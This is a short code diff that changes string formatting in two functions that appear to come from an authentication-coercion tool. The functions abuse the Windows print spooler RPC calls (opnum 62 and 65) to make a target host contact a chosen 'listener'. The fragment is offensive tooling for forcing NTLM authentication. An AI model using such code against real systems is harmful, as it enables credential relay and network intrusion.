@@ -21,7 +21,7 @@ def _check_success(e):
 def trigger_rprn_notification(dce, listener, listener_port=445, target=None, **kw):
     """RpcRemoteFindFirstPrinterChangeNotification (opnum 62)."""
     try:
-        resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
+        resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
         request = RpcRemoteFindFirstPrinterChangeNotification()
         request["hPrinter"] = resp["pHandle"]
         request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
@@ -42,7 +42,7 @@ def trigger_rprn_notification(dce, listener, listener_port=445, target=None, **k
 def trigger_rprn_notification_ex(dce, listener, listener_port=445, target=None, **kw):
     """RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65)."""
     try:
-        resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
+        resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
         request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
         request["hPrinter"] = resp["pHandle"]
         request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
